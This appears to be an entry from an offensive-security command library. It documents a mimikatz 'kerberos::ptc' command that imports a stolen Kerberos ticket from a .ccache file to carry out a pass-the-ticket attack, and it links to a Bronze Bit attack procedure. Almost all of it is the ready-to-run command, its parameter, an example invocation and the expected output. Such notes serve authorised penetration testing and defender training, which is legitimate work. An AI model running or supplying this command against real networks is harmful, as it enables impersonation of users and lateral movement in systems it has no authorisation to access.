---
type: command
executor: cmd
data: '.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit'
tags:
  - mimikatz
  - ticket
platforms:
  - Windows
verified: true
validated: true
---

# mimikatz-load-kerberos-ticket

## Command

```cmd
.\mimikatz\mimikatz.exe "kerberos::ptc $_TICKET_FILE" exit
```

## Description

Loads a Kerberos ticket from a .ccache file into the current session for pass-the-ticket attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| kerberos::ptc $_TICKET_FILE | Path to ticket file (e.g., User2.ccache) | Yes |

## Examples

### Basic Usage

```cmd
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit
```

## Expected Output

Ticket imported successfully; use kerberos::list to verify.

## Related

- [[procedures/Kerberos-Bronze-Bit-Attack]]
